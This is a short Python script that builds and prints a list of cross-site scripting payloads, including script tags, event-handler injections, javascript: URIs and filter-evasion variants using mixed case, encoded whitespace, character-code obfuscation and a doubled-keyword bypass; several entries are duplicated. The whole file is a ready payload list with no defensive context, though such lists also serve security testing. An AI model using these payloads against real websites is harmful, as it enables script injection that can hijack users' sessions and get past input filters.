# Function to generate XSS payloads
def generate_xss_payloads():
    payloads = [
        "<script>alert('XSS')</script>",
        "<img src='x' onerror='alert(\"XSS\")'>",
        "<svg onload='alert(\"XSS\")'></svg>",
        "<a href='javascript:alert(\"XSS\")'>Click me</a>",
        "<iframe src='javascript:alert(\"XSS\")'></iframe>",
        "<input type='text' value=''><img src=x onerror=alert(1)>",
        "<img src=x oneonerrorrror=alert(1)>",
        "<img src=x:alert(alt) onerror=eval(src) alt=alert(1)>",
        "<img src=x:alert(alt) onerror=eval(src) alt=alert(1) src=x:alert(src)>",
        "<img src=x onerror=alert(/XSS/) src=x>",
        "<IMG SRC=javascript:alert('XSS')>",
        "<IMG SRC=JaVaScRiPt:alert('XSS')>",
        "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
        "<IMG SRC=JaVaScRiPt:alert(String.fromCharCode(88,83,83))>",
        "<IMG SRC=\"jav\tascript:alert('XSS');\">",
        "<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">",
        "<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">",
        "<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">",
        "<IMG SRC=javascript:alert('XSS')>",
        "<IMG SRC=javascript:alert('XSS')>",
        "<IMG SRC=\"jav\tascript:alert('XSS');\">",
        "<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">",
        "<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">",
        "<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">",
    ]
    return payloads

# Usage example
xss_payloads = generate_xss_payloads()
for payload in xss_payloads:
    print(payload)
